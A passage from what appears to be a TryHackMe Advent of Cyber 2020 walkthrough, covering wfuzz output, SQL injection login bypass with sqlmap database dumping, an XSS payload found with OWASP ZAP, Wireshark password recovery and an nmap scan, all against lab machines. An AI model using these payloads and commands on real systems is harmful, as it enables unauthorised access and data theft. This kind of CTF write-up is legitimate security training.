C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201218%22%0A000040:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201209%22%0A000041:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201210%22%0A000042:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201211%22%0A000043:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201212%22%0A000044:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201213%22%0A000045:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201214%22%0A000046:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201215%22%0A000047:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201216%22%0A000048:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201217%22%0A000050:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201219%22%0A000051:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201220%22%0A000052:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201221%22%0A000053:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201222%22%0A000054:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201223%22%0A000055:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201224%22%0A000057:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201226%22%0A000056:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201225%22%0A000058:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201227%22%0A000001:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201100%22%0A000003:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201102%22%0A000002:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201101%22%0A000004:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201103%22%0A000005:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201104%22%0A000006:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201105%22%0A000007:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201106%22%0A000008:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201107%22%0A000009:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201108%22%0A000010:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201109%22%0A000011:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201110%22%0A000012:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201111%22%0A000013:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201112%22%0A000014:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201113%22%0A000015:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201114%22%0A000016:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201115%22%0A000017:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201116%22%0A000059:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201228%22%0A000060:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201229%22%0A000061:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201230%22%0A000062:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%2220201231%22%0A000063:%20%20C=200%20%20%20%20%20%200%20L%09%20%20%20%20%20%20%200%20W%09%20%20%20%20%20%200%20Ch%09%20%20%22%22%0A%0ATotal%20time:%200.109613%0AProcessed%20Requests:%2063%0AFiltered%20Requests:%200%0ARequests/sec.:%20574.7446" type="button"></button></div></div><pre><code>* Wfuzz 2.2.9 - The Web Fuzzer                         *
+
+Target: http://&lt;ip&gt;/&lt;dir&gt;/site-log.php?date=FUZZ
+Total requests: 63
+
+ID	Response   Lines      Word         Chars          Payload
+
+000018:  C=200      0 L	       0 W	      0 Ch	  "20201117"
+000019:  C=200      0 L	       0 W	      0 Ch	  "20201118"
+000021:  C=200      0 L	       0 W	      0 Ch	  "20201120"
+000020:  C=200      0 L	       0 W	      0 Ch	  "20201119"
+000022:  C=200      0 L	       0 W	      0 Ch	  "20201121"
+000023:  C=200      0 L	       0 W	      0 Ch	  "20201122"
+000024:  C=200      0 L	       0 W	      0 Ch	  "20201123"
+000025:  C=200      0 L	       0 W	      0 Ch	  "20201124"
+000026:  C=200      0 L	       1 W	     13 Ch	  "20201125"
+000027:  C=200      0 L	       0 W	      0 Ch	  "20201126"
+000028:  C=200      0 L	       0 W	      0 Ch	  "20201127"
+000029:  C=200      0 L	       0 W	      0 Ch	  "20201128"
+000030:  C=200      0 L	       0 W	      0 Ch	  "20201129"
+000031:  C=200      0 L	       0 W	      0 Ch	  "20201130"
+000032:  C=200      0 L	       0 W	      0 Ch	  "20201201"
+000033:  C=200      0 L	       0 W	      0 Ch	  "20201202"
+000034:  C=200      0 L	       0 W	      0 Ch	  "20201203"
+000035:  C=200      0 L	       0 W	      0 Ch	  "20201204"
+000036:  C=200      0 L	       0 W	      0 Ch	  "20201205"
+000038:  C=200      0 L	       0 W	      0 Ch	  "20201207"
+000037:  C=200      0 L	       0 W	      0 Ch	  "20201206"
+000039:  C=200      0 L	       0 W	      0 Ch	  "20201208"
+000049:  C=200      0 L	       0 W	      0 Ch	  "20201218"
+000040:  C=200      0 L	       0 W	      0 Ch	  "20201209"
+000041:  C=200      0 L	       0 W	      0 Ch	  "20201210"
+000042:  C=200      0 L	       0 W	      0 Ch	  "20201211"
+000043:  C=200      0 L	       0 W	      0 Ch	  "20201212"
+000044:  C=200      0 L	       0 W	      0 Ch	  "20201213"
+000045:  C=200      0 L	       0 W	      0 Ch	  "20201214"
+000046:  C=200      0 L	       0 W	      0 Ch	  "20201215"
+000047:  C=200      0 L	       0 W	      0 Ch	  "20201216"
+000048:  C=200      0 L	       0 W	      0 Ch	  "20201217"
+000050:  C=200      0 L	       0 W	      0 Ch	  "20201219"
+000051:  C=200      0 L	       0 W	      0 Ch	  "20201220"
+000052:  C=200      0 L	       0 W	      0 Ch	  "20201221"
+000053:  C=200      0 L	       0 W	      0 Ch	  "20201222"
+000054:  C=200      0 L	       0 W	      0 Ch	  "20201223"
+000055:  C=200      0 L	       0 W	      0 Ch	  "20201224"
+000057:  C=200      0 L	       0 W	      0 Ch	  "20201226"
+000056:  C=200      0 L	       0 W	      0 Ch	  "20201225"
+000058:  C=200      0 L	       0 W	      0 Ch	  "20201227"
+000001:  C=200      0 L	       0 W	      0 Ch	  "20201100"
+000003:  C=200      0 L	       0 W	      0 Ch	  "20201102"
+000002:  C=200      0 L	       0 W	      0 Ch	  "20201101"
+000004:  C=200      0 L	       0 W	      0 Ch	  "20201103"
+000005:  C=200      0 L	       0 W	      0 Ch	  "20201104"
+000006:  C=200      0 L	       0 W	      0 Ch	  "20201105"
+000007:  C=200      0 L	       0 W	      0 Ch	  "20201106"
+000008:  C=200      0 L	       0 W	      0 Ch	  "20201107"
+000009:  C=200      0 L	       0 W	      0 Ch	  "20201108"
+000010:  C=200      0 L	       0 W	      0 Ch	  "20201109"
+000011:  C=200      0 L	       0 W	      0 Ch	  "20201110"
+000012:  C=200      0 L	       0 W	      0 Ch	  "20201111"
+000013:  C=200      0 L	       0 W	      0 Ch	  "20201112"
+000014:  C=200      0 L	       0 W	      0 Ch	  "20201113"
+000015:  C=200      0 L	       0 W	      0 Ch	  "20201114"
+000016:  C=200      0 L	       0 W	      0 Ch	  "20201115"
+000017:  C=200      0 L	       0 W	      0 Ch	  "20201116"
+000059:  C=200      0 L	       0 W	      0 Ch	  "20201228"
+000060:  C=200      0 L	       0 W	      0 Ch	  "20201229"
+000061:  C=200      0 L	       0 W	      0 Ch	  "20201230"
+000062:  C=200      0 L	       0 W	      0 Ch	  "20201231"
+000063:  C=200      0 L	       0 W	      0 Ch	  ""
+
+Total time: 0.109613
+Processed Requests: 63
+Filtered Requests: 0
+Requests/sec.: 574.7446
+</code></pre><p>The date <code>20201125</code> contains characters, and we can query using the date in <code>firefox</code> to get the flag.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="http://%3Cip%3E/%3Cdir%3E/site-log.php?date=20201125" type="button"></button></div></div><pre><code>http://&lt;ip&gt;/&lt;dir&gt;/site-log.php?date=20201125
+</code></pre><h2 id="task-10---day-5---web-exploitation---someone-stole-santas-gift-list">Task 10 - Day 5 - Web Exploitation - Someone stole Santa’s gift list</h2><p>This page is about using <code>sql injection</code> payloads to bypass login and use <code>burpsuite</code> to save web page requests and use <code>sqlmap</code> to dump database contents using the web page requests.</p><h3 id="references-4">References</h3><ul><li><a href="https://www.youtube.com/watch?v=Kitx7cSNsuE" target="_blank">TryHackMe supporting material</a><li><a href="https://tryhackme.com/room/sqlibasics" target="_blank">TryHackMe supporting room</a><li><a href="https://www.codecademy.com/articles/sql-commands" target="_blank">SQL Commands</a><li><a href="https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet" target="_blank">SQLMap Cheatsheet</a><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank">SQL Injection Payload</a><li><a href="https://github.com/payloadbox/sql-injection-payload-list" target="_blank">SQL Injection Payload</a></ul><p>Use <code>firefox</code> to load the url <code>http://&lt;ip&gt;:3000</code> and check the page.</p><p>Use <code>firefox</code> to load the url <code>http://&lt;ip&gt;:3000</code>. The page will show the sql payload translation given in password tab.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="username%20-%20test%0Apassword%20-%20anything')%20or%20true;%20--" type="button"></button></div></div><pre><code>username - test
+password - anything') or true; --
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="SELECT%20*%20FROM%20users%0A%20%20WHERE%20username%20=%20'test'%0A%20%20AND%20password%20=%20MD5('anything')%20or%20true;%20--%20')" type="button"></button></div></div><pre><code>SELECT * FROM users
+  WHERE username = 'test'
+  AND password = MD5('anything') or true; -- ')
+</code></pre><p>Using payload <code>') or 1=1; --</code> will give sql payload translation as below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="SELECT%20*%20FROM%20users%0A%20%20WHERE%20username%20=%20'test'%0A%20%20AND%20password%20=%20MD5('')%20or%201=1;%20--%20')" type="button"></button></div></div><pre><code>SELECT * FROM users
+  WHERE username = 'test'
+  AND password = MD5('') or 1=1; -- ')
+</code></pre><p>Use <code>firefox</code> to load <code>&lt;ip&gt;:3000/init.php</code> to reset the database.</p><p>The following things are of interest in <code>sql injection</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="database()%0Auser()%0A@@version%0Ausername%0Apassword%0Atable_name%0Acolumn_name" type="button"></button></div></div><pre><code>database()
+user()
+@@version
+username
+password
+table_name
+column_name
+</code></pre><p>Guess the hidden directory under <code>http://&lt;ip&gt;:8000</code> using the words <code>santa secret login panel</code>.</p><p>Use <code>sql injection</code> as tried earlier in the hidden url <code>http://&lt;ip&gt;:8000/&lt;hidden&gt;</code>. In place of <code>password</code>, use any of the below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="')%20or%20true;%20--%0A'%20or%20true;%20--" type="button"></button></div></div><pre><code>') or true; --
+' or true; --
+</code></pre><p>Use <code>burpsuite</code> to save panel request.</p><ul><li>Open <code>firefox</code> and set proxy <code>127.0.0.1:8080</code><li>Open <code>burpsuite</code> and turn <code>intercept on</code><li>Use <code>firefox</code> to try login to <code>http://&lt;ip&gt;:8000/&lt;hidden&gt;</code> using <code>sql injection</code> in <code>password</code> field<li>In <code>Burpsuite</code>, in <code>proxy</code> tab, right click the content and <code>save as</code> <code>panel.request</code><li>Quit <code>burpsuite</code> and reverse proxy setting in <code>firefox</code></ul><p>Use <code>sqlmap</code> with the request file generated from <code>burpsuite</code> to dump database contents.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="sqlmap%20-r%20panel.results%20--tamper%20space2comment%20--dump-all%20--dbms%20sqlite%20--batch%20-v%200" type="button"></button></div></div><pre><code>sqlmap -r panel.results --tamper space2comment --dump-all --dbms sqlite --batch -v 0
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[*]%20starting%20at%2015:09:08%0A%0AGET%20parameter%20'search'%20is%20vulnerable.%20Do%20you%20want%20to%20keep%20testing%20the%20others%20(if%20any)?%20[y/N]%20N%0Asqlmap%20identified%20the%20following%20injection%20point(s)%20with%20a%20total%20of%2041%20HTTP(s)%20requests:%0A%0A---%0AParameter:%20search%20(GET)%0A%20%20%20%20Type:%20UNION%20query%0A%20%20%20%20Title:%20Generic%20UNION%20query%20(NULL)%20-%202%20columns%0A%20%20%20%20Payload:%20search=test'%20UNION%20ALL%20SELECT%20'qjqvq'%7C%7C'OydnlsPDdtZoWxuordTuVxiabcCLWDEsqWDTuMym'%7C%7C'qvxqq',NULL--%20qtKp%0A---%0Aback-end%20DBMS:%20SQLite%0A%0ADatabase:%20SQLite_masterdb%0ATable:%20sequels%0A[22%20entries]%0A+-------------+-----+----------------------------+%0A%7C%20kid%20%20%20%20%20%20%20%20%20%7C%20age%20%7C%20title%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A+-------------+-----+----------------------------+%0A%7C%20James%20%20%20%20%20%20%20%7C%208%20%20%20%7C%20shoes%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20John%20%20%20%20%20%20%20%20%7C%204%20%20%20%7C%20skateboard%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Robert%20%20%20%20%20%20%7C%2017%20%20%7C%20iphone%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Michael%20%20%20%20%20%7C%205%20%20%20%7C%20playstation%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20William%20%20%20%20%20%7C%206%20%20%20%7C%20xbox%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20David%20%20%20%20%20%20%20%7C%206%20%20%20%7C%20candy%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Richard%20%20%20%20%20%7C%209%20%20%20%7C%20books%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Joseph%20%20%20%20%20%20%7C%207%20%20%20%7C%20socks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Thomas%20%20%20%20%20%20%7C%2010%20%20%7C%2010%20McDonalds%20meals%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Charles%20%20%20%20%20%7C%203%20%20%20%7C%20toy%20car%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Christopher%20%7C%208%20%20%20%7C%20air%20hockey%20table%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Daniel%20%20%20%20%20%20%7C%2012%20%20%7C%20lego%20star%20wars%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Matthew%20%20%20%20%20%7C%2015%20%20%7C%20bike%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Anthony%20%20%20%20%20%7C%203%20%20%20%7C%20table%20tennis%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Donald%20%20%20%20%20%20%7C%204%20%20%20%7C%20fazer%20chocolate%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Mark%20%20%20%20%20%20%20%20%7C%2017%20%20%7C%20wii%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Paul%20%20%20%20%20%20%20%20%7C%209%20%20%20%7C%20%3Cwish%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20James%20%20%20%20%20%20%20%7C%208%20%20%20%7C%20finnish-english%20dictionary%20%7C%0A%7C%20Steven%20%20%20%20%20%20%7C%2011%20%20%7C%20laptop%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Andrew%20%20%20%20%20%20%7C%2016%20%20%7C%20rasberry%20pie%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Kenneth%20%20%20%20%20%7C%2019%20%20%7C%20TryHackMe%20Sub%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Joshua%20%20%20%20%20%20%7C%2012%20%20%7C%20chair%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A+-------------+-----+----------------------------+%0A%0ADatabase:%20SQLite_masterdb%0ATable:%20hidden_table%0A[1%20entry]%0A+-----------------------------------------+%0A%7C%20flag%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A+-----------------------------------------+%0A%7C%20%3Cflag%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A+-----------------------------------------+%0A%0ADatabase:%20SQLite_masterdb%0ATable:%20users%0A[1%20entry]%0A+----------+------------------+%0A%7C%20username%20%7C%20password%20%20%20%20%20%20%20%20%20%7C%0A+----------+------------------+%0A%7C%20admin%20%20%20%20%7C%20%3Cpassword%3E%20%20%20%20%20%20%20%7C%0A+----------+------------------+%0A%0A[*]%20shutting%20down%20at%2015:09:11" type="button"></button></div></div><pre><code>[*] starting at 15:09:08
+
+GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:
+
+---
+Parameter: search (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: search=test' UNION ALL SELECT 'qjqvq'||'OydnlsPDdtZoWxuordTuVxiabcCLWDEsqWDTuMym'||'qvxqq',NULL-- qtKp
+---
+back-end DBMS: SQLite
+
+Database: SQLite_masterdb
+Table: sequels
+[22 entries]
++-------------+-----+----------------------------+
+| kid         | age | title                      |
++-------------+-----+----------------------------+
+| James       | 8   | shoes                      |
+| John        | 4   | skateboard                 |
+| Robert      | 17  | iphone                     |
+| Michael     | 5   | playstation                |
+| William     | 6   | xbox                       |
+| David       | 6   | candy                      |
+| Richard     | 9   | books                      |
+| Joseph      | 7   | socks                      |
+| Thomas      | 10  | 10 McDonalds meals         |
+| Charles     | 3   | toy car                    |
+| Christopher | 8   | air hockey table           |
+| Daniel      | 12  | lego star wars             |
+| Matthew     | 15  | bike                       |
+| Anthony     | 3   | table tennis               |
+| Donald      | 4   | fazer chocolate            |
+| Mark        | 17  | wii                        |
+| Paul        | 9   | &lt;wish&gt;                     |
+| James       | 8   | finnish-english dictionary |
+| Steven      | 11  | laptop                     |
+| Andrew      | 16  | rasberry pie               |
+| Kenneth     | 19  | TryHackMe Sub              |
+| Joshua      | 12  | chair                      |
++-------------+-----+----------------------------+
+
+Database: SQLite_masterdb
+Table: hidden_table
+[1 entry]
++-----------------------------------------+
+| flag                                    |
++-----------------------------------------+
+| &lt;flag&gt;                                  |
++-----------------------------------------+
+
+Database: SQLite_masterdb
+Table: users
+[1 entry]
++----------+------------------+
+| username | password         |
++----------+------------------+
+| admin    | &lt;password&gt;       |
++----------+------------------+
+
+[*] shutting down at 15:09:11
+</code></pre><h2 id="task-11---day-6---web-exploitation---be-careful-with-what-you-wish-on-a-christmas-night">Task 11 - Day 6 - Web Exploitation - Be careful with what you wish on a Christmas night</h2><p>This task is about using <code>owasp zap</code> to perform automated scan to get valid queries for web site.</p><h3 id="references-5">References</h3><ul><li><a href="https://www.youtube.com/watch?v=cNYhpbUtkJw" target="_blank">TryHackMe supporting material</a><li><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md" target="_blank">OWASP Input validation Cheat Sheet</a><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank">XSS Injection Reference</a><li><a href="https://github.com/payloadbox/xss-payload-list" target="_blank">XSS Payload List</a></ul><p>Use <code>firefox</code> to manipuate running test query.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="http://%3Cip%3E:5000/?q=test" type="button"></button></div></div><pre><code>http://&lt;ip&gt;:5000/?q=test
+</code></pre><p>Use <code>owasp zap</code> to perform automated scan and get valid queries.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="http://%3Cip%3E:5000%0AAttack" type="button"></button></div></div><pre><code>http://&lt;ip&gt;:5000
+Attack
+</code></pre><p>Use <code>firefox</code> to send payload queries generated by <code>owasp zap</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="http://%3Cip%3E:5000/?q=%0Ahttp://%3Cip%3E:5000/?q=%3C/p%3E%3Cscript%3Ealert(1);%3C/script%3E%3Cp%3E" type="button"></button></div></div><pre><code>http://&lt;ip&gt;:5000/?q=
+http://&lt;ip&gt;:5000/?q=&lt;/p&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;p&gt;
+</code></pre><h2 id="task-12---day-7---networking---the-grinch-really-did-steal-christmas">Task 12 - Day 7 - Networking - The Grinch Really Did Steal Christmas</h2><p>This task is about using <code>wireshark</code> to understand filter methods and get encrypted/unencrypted data from various protocols.</p><h3 id="references-6">References</h3><ul><li><a href="https://www.youtube.com/watch?v=yZTPMoYY2CA" target="_blank">TryHackMe supporting material</a></ul><p>Use <code>wireshark</code> to analyse <code>pcap1.pcap</code> file. Use the filter <code>icmp</code> to get just the packets related to icmp protocol. Use <code>http.request.method == GET</code> to get the http packets for GET method. Apart from the common favicons, index and fonts, there will be a blog post the user visited.</p><p>Use <code>wireshark</code> to analyse <code>pcap2.pcap</code> file. Use the filter <code>tcp.port == 21</code> to filter the ftp packets. Since <code>FTP</code> protocol is not encrypted communication, there will be a packet which contains plaintext password. Use <code>protocol hierarchy</code> in <code>statistics</code> to group packets according to their type and check which other protocol in the list is encrypted.</p><p>Use <code>wireshark</code> to analyse <code>pcap2.pcap</code> file.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Statistics%0A%20%20-%20Protocol%20Hierarchy%0A%20%20-%20HTTP%0A%20%20%20%20-%20Apply%20as%20filter%0A%20%20%20%20%20%20-%20Selected%0AFile%0A%20%20-%20Export%20objects%0A%20%20%20%20-%20HTTP" type="button"></button></div></div><pre><code>Statistics
+  - Protocol Hierarchy
+  - HTTP
+    - Apply as filter
+      - Selected
+File
+  - Export objects
+    - HTTP
+</code></pre><p>Unzip the file <code>unzip christmas.zip</code> to get the item mcskidy wished for.</p><h2 id="task-13---day-8---networking---whats-under-the-christmas-tree">Task 13 - Day 8 - Networking - What’s Under the Christmas Tree?</h2><p>This task is about using <code>nmap</code> to discover ports and information about their services and using <code>nse</code> scripts.</p><h3 id="references-7">References</h3><ul><li><a href="https://www.youtube.com/watch?v=StmtQKoFiWg" target="_blank">TryHackMe supporting material</a><li><a href="https://4n3i5v74.github.io/posts/cheatsheet-nmap/" target="_blank">NMAP Reference</a><li><a href="http://www.pentest-standard.org/index.php/Main_Page" target="_blank">Pentest standard</a><li><a href="https://rules.emergingthreats.net/" target="_blank">Emerging threats rules</a><li><a href="https://www.pfsense.org/" target="_blank">PFsense</a><li><a href="https://www.snort.org/" target="_blank">Snort</a><li><a href="https://suricata-ids.org/" target="_blank">Suricata</a></ul><p>Create a host entry for the <ip> as below.</ip></p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="vim%20/etc/hosts%0A%20%20%3Cip%3E%20%20tbfc.blog" type="button"></button></div></div><pre><code>vim /etc/hosts
+  &lt;ip&gt;  tbfc.blog
+</code></pre><p>Use <code>nmap</code> to scan for open ports with automatic service detection and nse script run.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nmap%20-Pn%20-T4%20-sS%20--reason%20--open%20--top-ports%201000%20-A%20%3Cip%3E" type="button"></button></div></div><pre><code>nmap -Pn -T4 -sS --reason --open --top-ports 1000 -A &lt;ip&gt;
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20Nmap%207.60%20(%20https://nmap.org%20)%20at%202021-01-20%2003:15%20GMT%0ANmap%20scan%20report%20for%20tbfc.blog%20(%3Cip%3E)%0AHost%20is%20up,%20received%20arp-response%20(0.00083s%20latency).%0ANot%20shown:%20997%20closed%20ports%0AReason:%20997%20resets%0APORT%20%20%20%20%20STATE%20SERVICE%20%20%20%20%20%20%20REASON%20%20%20%20%20%20%20%20%20VERSION%0A%3Cport%3E/tcp%20%20%20open%20%20http%20%20%20%20%20%20%20%20%20%20syn-ack%20ttl%2064%20Apache%20httpd%202.4.29%20((%3COS%3E))%0A%7C_http-generator:%20Hugo%200.78.2%0A%7C_http-server-header:%20Apache/2.4.29%20(%3COS%3E)%0A%7C_http-title:%20TBFC&#39;s%20%3Cwebsite-type%3E%0A%3Cport%3E/tcp%20open%20%20ssh%20%20%20%20%20%20%20%20%20%20%20syn-ack%20ttl%2064%20OpenSSH%207.6p1%20%3COS%3E%204%3COS%3E0.3%20(%3COS%3E%20Linux;%20protocol%202.0)%0A%7C%20ssh-hostkey:%0A%7C%20%20%202048%20cf:c9:99:d0:5c:09:27:cd:a1:a8:1b:c2:b1:d5:ef:a6%20(RSA)%0A%7C%20%20%20256%204c:d4:f9:20:6b:ce:fc:62:99:54:7d:c2:b4:b2:f2:b2%20(ECDSA)%0A%7C_%20%20256%20d0:e6:72:18:b5:20:89:75:d5:69:74:ac:cc:b8:3b:9b%20(EdDSA)%0A%3Cport%3E/tcp%20open%20%20ms-wbt-server%20syn-ack%20ttl%2064%20xrdp%0AMAC%20Address:%2002:40:D3:C4:50:2D%20(Unknown)%0ANo%20exact%20OS%20matches%20for%20host%20(If%20you%20know%20